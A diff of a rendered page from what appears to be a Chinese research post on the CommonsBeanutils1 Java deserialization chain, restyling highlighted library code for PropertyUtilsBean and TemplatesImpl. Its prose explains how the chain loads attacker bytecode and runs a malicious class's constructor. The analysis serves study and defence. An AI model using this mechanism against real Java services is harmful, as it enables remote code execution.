-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getSimpleProperty</span>(Object bean, String name) <span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (bean <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">&#34;No bean specified&#34;</span>);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (name <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">&#34;No name specified for bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">hasNested</span>(name)) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">&#34;Nested property names are not allowed: Property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isIndexed</span>(name)) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">&#34;Indexed property names are not allowed: Property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isMapped</span>(name)) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">&#34;Mapped property names are not allowed: Property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (bean <span style="color:#66d9ef">instanceof</span> DynaBean) {
-</span></span><span style="display:flex;"><span>            DynaProperty descriptor <span style="color:#f92672">=</span> ((DynaBean)bean).<span style="color:#a6e22e">getDynaClass</span>().<span style="color:#a6e22e">getDynaProperty</span>(name);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (descriptor <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NoSuchMethodException(<span style="color:#e6db74">&#34;Unknown property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on dynaclass &#39;&#34;</span> <span style="color:#f92672">+</span> ((DynaBean)bean).<span style="color:#a6e22e">getDynaClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> ((DynaBean)bean).<span style="color:#a6e22e">get</span>(name);
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            PropertyDescriptor descriptor <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getPropertyDescriptor</span>(bean, name);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (descriptor <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NoSuchMethodException(<span style="color:#e6db74">&#34;Unknown property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on class &#39;&#34;</span> <span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                Method readMethod <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getReadMethod</span>(bean.<span style="color:#a6e22e">getClass</span>(), descriptor);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (readMethod <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NoSuchMethodException(<span style="color:#e6db74">&#34;Property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; has no getter method in class &#39;&#34;</span> <span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                    Object value <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">invokeMethod</span>(readMethod, bean, EMPTY_OBJECT_ARRAY);
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> value;
-</span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getSimpleProperty</span><span style="color:#f92672">(</span>Object bean<span style="color:#f92672">,</span> String name<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IllegalAccessException<span style="color:#f92672">,</span> InvocationTargetException<span style="color:#f92672">,</span> NoSuchMethodException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>bean <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;No bean specified&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>name <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;No name specified for bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">resolver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">hasNested</span><span style="color:#f92672">(</span>name<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Nested property names are not allowed: Property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">resolver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">isIndexed</span><span style="color:#f92672">(</span>name<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Indexed property names are not allowed: Property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">resolver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">isMapped</span><span style="color:#f92672">(</span>name<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Mapped property names are not allowed: Property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>bean <span style="color:#66d9ef">instanceof</span> DynaBean<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            DynaProperty descriptor <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>DynaBean<span style="color:#f92672">)</span>bean<span style="color:#f92672">).</span><span style="color:#a6e22e">getDynaClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDynaProperty</span><span style="color:#f92672">(</span>name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>descriptor <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NoSuchMethodException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Unknown property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on dynaclass &#39;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#f92672">((</span>DynaBean<span style="color:#f92672">)</span>bean<span style="color:#f92672">).</span><span style="color:#a6e22e">getDynaClass</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#f92672">((</span>DynaBean<span style="color:#f92672">)</span>bean<span style="color:#f92672">).</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            PropertyDescriptor descriptor <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getPropertyDescriptor</span><span style="color:#f92672">(</span>bean<span style="color:#f92672">,</span> name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>descriptor <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NoSuchMethodException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Unknown property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on class &#39;&#34;</span> <span style="color:#f92672">+</span> bean<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                Method readMethod <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getReadMethod</span><span style="color:#f92672">(</span>bean<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">(),</span> descriptor<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>readMethod <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NoSuchMethodException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; has no getter method in class &#39;&#34;</span> <span style="color:#f92672">+</span> bean<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    Object value <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">invokeMethod</span><span style="color:#f92672">(</span>readMethod<span style="color:#f92672">,</span> bean<span style="color:#f92672">,</span> EMPTY_OBJECT_ARRAY<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> value<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>
 <img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/5.png" /></p>
 <p><code>TemplatesImpl</code>类中<code>getOutputProperties</code>方法代码如下，会调用<code>newTransformer</code>方法</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> Properties <span style="color:#a6e22e">getOutputProperties</span>() {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> newTransformer().<span style="color:#a6e22e">getOutputProperties</span>();
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (TransformerConfigurationException e) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> Transformer <span style="color:#a6e22e">newTransformer</span>()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> Properties <span style="color:#a6e22e">getOutputProperties</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> newTransformer<span style="color:#f92672">().</span><span style="color:#a6e22e">getOutputProperties</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>TransformerConfigurationException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> Transformer <span style="color:#a6e22e">newTransformer</span><span style="color:#f92672">()</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> TransformerConfigurationException
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        TransformerImpl transformer;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        TransformerImpl transformer<span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformerImpl(getTransletInstance(), _outputProperties,
-</span></span><span style="display:flex;"><span>            _indentNumber, _tfactory);
+</span></span><span style="display:flex;"><span>        transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformerImpl<span style="color:#f92672">(</span>getTransletInstance<span style="color:#f92672">(),</span> _outputProperties<span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>            _indentNumber<span style="color:#f92672">,</span> _tfactory<span style="color:#f92672">);</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (_uriResolver <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            transformer.<span style="color:#a6e22e">setURIResolver</span>(_uriResolver);
-</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_uriResolver <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            transformer<span style="color:#f92672">.</span><span style="color:#a6e22e">setURIResolver</span><span style="color:#f92672">(</span>_uriResolver<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (_tfactory.<span style="color:#a6e22e">getFeature</span>(XMLConstants.<span style="color:#a6e22e">FEATURE_SECURE_PROCESSING</span>)) {
-</span></span><span style="display:flex;"><span>            transformer.<span style="color:#a6e22e">setSecureProcessing</span>(<span style="color:#66d9ef">true</span>);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> transformer;
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_tfactory<span style="color:#f92672">.</span><span style="color:#a6e22e">getFeature</span><span style="color:#f92672">(</span>XMLConstants<span style="color:#f92672">.</span><span style="color:#a6e22e">FEATURE_SECURE_PROCESSING</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            transformer<span style="color:#f92672">.</span><span style="color:#a6e22e">setSecureProcessing</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> transformer<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>newTransformer会调用getTransletInstance方法，在该方法内会调用defineTransletClasses方法，defineTransletClasses会读取_bytecodes并通过defineClass方法通过字节码加载成对应的类并构造对应的对象，所以这个过程会执行恶意类的构造方法。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> Translet <span style="color:#a6e22e">getTransletInstance</span>()
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> TransformerConfigurationException {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (_name <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> Translet <span style="color:#a6e22e">getTransletInstance</span><span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> TransformerConfigurationException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_name <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (_class <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) defineTransletClasses();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_class <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> defineTransletClasses<span style="color:#f92672">();</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// The translet needs to keep a reference to all its auxiliary</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// class to prevent the GC from collecting them</span>
-</span></span><span style="display:flex;"><span>            AbstractTranslet translet <span style="color:#f92672">=</span> (AbstractTranslet) _class<span style="color:#f92672">[</span>_transletIndex<span style="color:#f92672">]</span>.<span style="color:#a6e22e">newInstance</span>();
-</span></span><span style="display:flex;"><span>            translet.<span style="color:#a6e22e">postInitialization</span>();
-</span></span><span style="display:flex;"><span>            translet.<span style="color:#a6e22e">setTemplates</span>(<span style="color:#66d9ef">this</span>);
-</span></span><span style="display:flex;"><span>            translet.<span style="color:#a6e22e">setOverrideDefaultParser</span>(_overrideDefaultParser);
-</span></span><span style="display:flex;"><span>            translet.<span style="color:#a6e22e">setAllowedProtocols</span>(_accessExternalStylesheet);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (_auxClasses <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>                translet.<span style="color:#a6e22e">setAuxiliaryClasses</span>(_auxClasses);
-</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// The translet needs to keep a reference to all its auxiliary
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// class to prevent the GC from collecting them
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            AbstractTranslet translet <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>AbstractTranslet<span style="color:#f92672">)</span> _class<span style="color:#f92672">[</span>_transletIndex<span style="color:#f92672">].</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            translet<span style="color:#f92672">.</span><span style="color:#a6e22e">postInitialization</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            translet<span style="color:#f92672">.</span><span style="color:#a6e22e">setTemplates</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            translet<span style="color:#f92672">.</span><span style="color:#a6e22e">setOverrideDefaultParser</span><span style="color:#f92672">(</span>_overrideDefaultParser<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            translet<span style="color:#f92672">.</span><span style="color:#a6e22e">setAllowedProtocols</span><span style="color:#f92672">(</span>_accessExternalStylesheet<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_auxClasses <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                translet<span style="color:#f92672">.</span><span style="color:#a6e22e">setAuxiliaryClasses</span><span style="color:#f92672">(</span>_auxClasses<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> translet;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (InstantiationException e) {
-</span></span><span style="display:flex;"><span>            ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span>, _name);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (IllegalAccessException e) {
-</span></span><span style="display:flex;"><span>            ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span>, _name);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
-</span></span><span style="display:flex;"><span>        }
